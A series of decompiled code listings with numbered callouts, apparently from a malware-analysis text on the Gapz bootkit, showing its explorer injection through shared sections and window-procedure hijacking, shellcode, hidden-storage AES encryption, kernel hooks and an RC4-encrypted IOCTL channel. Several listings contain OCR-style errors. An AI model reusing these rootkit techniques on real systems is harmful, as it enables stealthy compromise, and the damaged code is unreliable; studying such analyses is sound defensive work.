["```\nint _stdcall alloc_mem(STRUCT_IPL_THREAD_2 *al, int pBuffer, unsigned int\nSize, int Pool)\n\n{\n\n   v7 = -1;\n\n    for ( i = -30000000; ; (a1->KeDelagExecutionThread)(0, 0, &i) )\n\n    {\n\n        v4 = (a1->ExAllocatePoolWithTag)(Pool, Size, ➊'ZPAG');\n\n        if ( v4 )\n\n            break;\n\n    }\n\n    memset(v4, 0, Size);\n\n    result = pBuffer;\n\n    *pBuffer = v4;\n\n    return result;\n\n}\n```", "```\nchar _stdcall OpenSection_(HANDLE *hSection, int pBase, int *pRegSize)\n\n{\n\n    sect_name = L\"\\\\BaseNamedObjects\\\\ShimSharedMemory\";\n\n    v7 = L\"\\\\BaseNamedObjects\\\\windows_shell_global_counters\";\n\n    v8 = L\"\\\\BaseNamedObjects\\\\MSCTF.Shared.SFM.MIH\";\n\n    v9 = L\"\\\\BaseNamedObjects\\\\MSCTF.Shared.SFM.AMF\";\n\n    v10 = L\"\\\\BaseNamedObjectsUrlZonesSM_Administrator\";\n\n    i = 0;\n\n    while ( OpenSection(hSection, (&sect_name)[i], pBase, pRegSize) < 0 )\n\n    {\n\n        if ( ++i >= 5 )\n\n            return 0;\n\n    }\n\n    if ( VirtualQuery(*pBase, &Buffer, 0xlCu) )\n\n        *pRegSize = v7;\n\n    return 1;\n\n}\n```", "```\nchar __cdecl InjectIntoExplorer()\n\n{\n\n  returnValue = 0;\n\n  if ( OpenSectionObject(&hSection, &SectionBase, &SectSize) )  // open some of SHIM sections\n\n  {\n\n ➊ TargetBuffer = (SectionBase + SectSize - 0x150);            // find free space in the end\n\n                                                                // of the section\n\n    memset(TargetBuffer, 0, 0x150u);\n\n    qmemcpy(TargetBuffer->code, sub_408468, sizeof(TargetBuffer->code));\n\n    hKernel32 = GetModuleHandleA(\"kernel32.dll\");\n\n ➋ TargetBuffer->CloseHandle = GetExport(hKernel32, \"CloseHandle\", 0);\n\n    TargetBuffer->MapViewOfFile = GetExport(hKernel32, \"MapViewOfFile\", 0);\n\n    TargetBuffer->OpenFileMappingA = GetExport(hKernel32, \"OpenFileMappingA\", 0);\n\n    TargetBuffer->CreateThread = GetExport(hKernel32, \"CreateThread\", 0);\n\n    hUser32 = GetModuleHandleA(\"user32.dll\");\n\n    TargetBuffer->SetWindowLongA = GetExport(hUser32, \"SetWindowLongA\", 0);\n\n ➌ TargetBuffer_ = ConstructTargetBuffer(TargetBuffer);\n\n    if ( TargetBuffer_ )\n\n    {\n\n      hWnd = FindWindowA(\"Shell_TrayWnd\", 0);\n\n   ➍ originalWinProc = GetWindowLongA(hWnd, 0);\n\n      if ( hWnd && originalWinProc )\n\n      {\n\n        TargetBuffer->MappingName[10] = 0;\n\n        TargetBuffer->Shell_TrayWnd = hWnd;\n\n        TargetBuffer->Shell_TrayWnd_Long_0 = originalWinProc;\n\n        TargetBuffer->icmnf = GetExport(CurrentImageAllocBase, \"icmnf\", 1);\n\n        qmemcpy(&TargetBuffer->field07, &MappingSize, 0xCu);\n\n        TargetBuffer->gpi = GetExport(CurrentImageAllocBase, \"gpi\", 1);\n\n        BotId = InitBid();\n\n        lstrcpynA(TargetBuffer->MappingName, BotId, 10);\n\n        if ( CopyToFileMappingAndReloc(TargetBuffer->MappingName, CurrentImageAllocBase,\n\n                                       CurrentImageSizeOfImage, &hObject) )\n\n        {\n\n          BotEvent = CreateBotEvent();\n\n          if ( BotEvent )\n\n          {\n\n         ➎ SetWindowLongA(hWnd, 0, &TargetBuffer_->pKiUserApcDispatcher);\n\n         ➏ SendNotifyMessageA(hWnd, 0xFu, 0, 0);\n\n            if ( !WaitForSingleObject(BotEvent, 0xBB80u) )\n\n              returnValue = 1;\n\n            CloseHandle(BotEvent);\n\n          }\n\n          CloseHandle(hObject);\n\n        }\n\n      }\n\n    }\n\n    NtUnmapViewOfSection(-1, SectionBase);\n\n    NtClose(hSection);\n\n  }\n\n  return returnValue;\n\n}\n```", "```\nint __stdcall ShellCode(int a1, STRUCT_86_INJECT *a2, int a3, int a4)\n\n{\n\n  if ( !BYTE2(a2->injected) )\n\n  {\n\n    BYTE2(a2->injected) = 1;\n\n ➊ hFileMapping = (a2->call_OpenFileMapping)(38, 0, &a2->field4);\n\n    if ( hFileMapping )\n\n    {\n\n   ➋ ImageBase = (a2->call_MapViewOfFile)(hFileMapping, 38, 0, 0, 0);\n\n      if ( ImageBase )\n\n      {\n\n        qmemcpy((ImageBase + a2->bytes_5), &a2->field0, 0xCu);\n\n     ➌ (a2->call_CreateThread)(0, 0, ImageBase + a2->routineOffs, ImageBase, 0, 0);\n\n      }\n\n      (a2->call_CloseHandle)( hFileMapping );\n\n    }\n\n  }\n\n➍ (a2->call_SetWindowLongA)(a2->hWnd, 0, a2->OriginalWindowProc);\n\n  return 0;\n\n}\n```", "```\ntypedef struct _BIOS_PARAMETER_BLOCK_NTFS {\n\n   WORD SectorSize;\n\n   BYTE SectorsPerCluster;\n\n   WORD ReservedSectors;\n\n   BYTE Reserved[5];\n\n   BYTE MediaId;\n\n   BYTE Reserved2[2];\n\n   WORD SectorsPerTrack;\n\n   WORD NumberOfHeads;\n\n➊ DWORD HiddenSectors;\n\n   BYTE Reserved3[8];\n\n   QWORD NumberOfSectors;\n\n   QWORD MFTStartingCluster;\n\n   QWORD MFTMirrorStartingCluster;\n\n   BYTE ClusterPerFileRecord;\n\n   BYTE Reserved4[3];\n\n   BYTE ClusterPerIndexBuffer;\n\n   BYTE Reserved5[3];\n\n   QWORD NTFSSerial;\n\n   BYTE Reserved6[4];\n\n} BIOS_PARAMETER_BLOCK_NTFS, *PBIOS_PARAMETER_BLOCK_NTFS;\n```", "```\nstruct GAPZ_BASIC_BLOCK_HEADER\n\n{\n\n    // A constant that is used to obtain addresses\n\n    // of the routines implemented in the block\n\n ➊ unsigned int ProcBase;\n\n    unsigned int Reserved[2];\n\n    // Offset to the next block\n\n ➋ unsigned int NextBlockOffset;\n\n    // Offset of the routine performing block initialization\n\n ➌ unsigned int BlockInitialization;\n\n    // Offset to configuration information\n\n    // from the end of the kernel-mode module\n\n    // valid only for the first block\n\n    unsigned int CfgOffset;\n\n    // Set to zeroes\n\n    unsigned int Reserved1[2];\n\n}\n```", "```\nint __stdcall OpenRegKey(PHANDLE hKey, PUNICODE_STRING Name)\n\n{\n\n    OBJECT_ATTRIBUTES obj_attr; // [esp+Oh] (ebp-1Ch)@1\n\n    int _global_ptr; // [esp+18h] (ebp-4h)@1\n\n    global ptr = OxBBBBBBBB;\n\n    obj_attr.ObjectName = Name;\n\n    obj_attr.RootDirectory = 0;\n\n    obj_attr.SecurityDescriptor = 0;\n\n    obj_attr.SecurityQualityOfService = 0;\n\n    obj_attr.Length = 24;\n\n    obj_attr.Attributes = 576;\n\n    return (MEMORY[0xBBBBBBB] ->Zw0penKey)(hKey, 0x20019 &ob attr);\n\n}\n```", "```\nint stdcall aes_crypt_sectors_cbc(int 1V, int c_text, int p_text, int num_of_sect,\n\n                                  int bEncrypt, STRUCT_AES_KEY *Key)\n\n{\n\n    int result; // eax01\n\n    int _iv; // edi02\n\n    int cbc_iv[4]; // [esp+0h] [ebp-14h)@3\n\n   STRUCT_IPL_THREAD_1 *gl_struct; // [esp+10h] [ebp-4h}@1\n\n    gl_struct = 0xBBBBBBBB;\n\n    result = num_of_sect;\n\n    if ( num_of_sect )\n\n    {\n\n     ➊ _iv = IV;\n\n        do\n\n        {\n\n            cbc_iv[3] = 0;\n\n            cbc_iv[2] = 0;\n\n            cbc_iv[1] = 0;\n\n            cbc iu[0] = _iv; // CBC initialization value\n\n            result = (gl_struct->crypto->aes_crypt_cbc)(Key, bEncrypt, 512, cbc_iv,\n\n                                                        p_text, c_text);\n\n            p_text += 512; // plain text\n\n            c text += 512; // ciper text\n\n         ➋ ++_iv;\n\n            --num_of_sect;\n\n        }\n\n        while( num_of_sect );\n\n    }\n\n    return result;\n\n}\n```", "```\n   SCSIPORTncsiPortGlobalDispatch:\n\n   f84ce44c 8bff                       mov     edi,edi\n\n➊ f84ce44e e902180307                 jmp     ff4ffc55\n\n   f84ce453 088b42288b40               or      byte ptr [ebx+408B2842h],c1\n\n   f84ce459 1456                       adc     a1,56h\n\n   f84ce45b 8b750c                     mov     esi,dword ptr [ebp+0Ch]\n\n   f84ce45e 8b4e60                     mov     ecx,dword ptr [esi+60h}]\n\n   f84ce461 0fb609                     movzx   ecx,byte ptr [ecx]\n\n   f84ce464 56                         push    esi\n\n   f84ce465 52                         push    edx\n\n   f84ce466 ff1488                     call    dword ptr [eax+ecx*4]\n\n   f84ce469 5e                         pop     esi\n\n   f84ce46a 5d                         pop     ebp\n\n   f84ce46b c20800                     ret     8\n```", "```\nfor ( patch_offset = code_to_patch; ; patch_offset += instr.len )\n\n{\n\n    (v42->proc_buff_3->disasm)(patch_offset, &instr);\n\n    if ( (instr.len != 1 || instr.opcode != 0x90u)\n\n        && (instr.len != 2 || instr.opcode != 8x89u &&\n\n            instr.opcode != Ox8Bu || instr.modrm_rm != instr.modrm_reg) ) )\n\n    {\n\n        break;\n\n    }\n\n}\n```", "```\nstruct GAPZ_PAYLOAD_CFG\n\n{\n\n  // Full path to payload module into hidden storage\n\n  char PayloadPath[128];\n\n  // name of the process image\n\n➊ char TargetProcess[64];\n\n  // Specifies load options: x86 or x64 and and so on\n\n➋ unsigned char LoadOptions;\n\n  // Reserved\n\n  unsigned char Reserved[2];\n\n  // Payload type: overlord, other\n\n➌ unsigned char PayloadType;\n\n}\n```", "```\nhooked_ioctl = MEMORY[0xBBBBBBE3]->IoControlCode_HookArray;\n\n➊ while ( *hooked_ioctl != IoStack->Parameters.DeviceIoControl_IoControlCode )\n\n{\n\n    ++1; // check if the request comes from the payload\n\n    ++hooked_ioctl;\n\n    if ( i >= IRP_MJ_SYSTEM_CONTROL )\n\n        goto LABEL_11;\n\n}\n\nUserBuff = Irp->UserBuffer;\n\nIoStack = IoStack->Parameters_DeviceIoControl.OutputBufferLength;\n\nOutputBufferLength = IoStack;\n\nif ( UserBuff )\n\n{\n\n    // decrypt payload request\n\n ➋ (MEMORY [0xBBBBBBBF]->rc4)(UserBuff, IoStack, MEMORY [0xBBBBBBBB]->rc4_key, 48);\n\n    v4 = 0xBBBBBBBB;\n\n    // check signature\n\n    if ( *UserBuff == 0x34798977 )\n\n    {\n\n        hooked_ioctl = MEMORY [0xBBBBBBE3];\n\n        IoStack = i;\n\n        // determine the handler\n\n        if ( UserBuff[1] == MEMORY [0xBBBBBBE3]->IoControlCodeSubCmd_Hook[i] )\n\n        {\n\n           ➌ (MEMORY [0xBBBBBBE3] ->IoControlCode_HookDpc[i])(UserBuff);\n\n           ➍ (MEMORY [0xBBBBBBBF]( ->rc4)( // encrypt the reply\n\n                UserBuff,\n\n                OutputBufferLength,\n\n                MEMORY [0xBRBBBBBB] ->rc4_key,\n\n                48);\n\n            v4 = 0xBBBBBBBB;\n\n        }\n\n        _Irp = Irp;\n\n    }\n\n}\n```", "```\n// open handle for \\Device\\NULL\n\n➊  HANDLE hNull = CreateFile(_T(\"\\\\??\\\\NUL\"), ...);\n\nif(hNull != INVALID_HANDLE_VALUE) {\n\n  // Send request to kernel-mode module\n\n➋ DWORD dwResult = DeviceIoControl(hNUll, WIN32_GAPZ_IOCTL, InBuffer, InBufferSize, OutBuffer,\n\n                                   OutBufferSize, &BytesRead);\n\n  CloseHandle(hNull);\n\n}\n```"]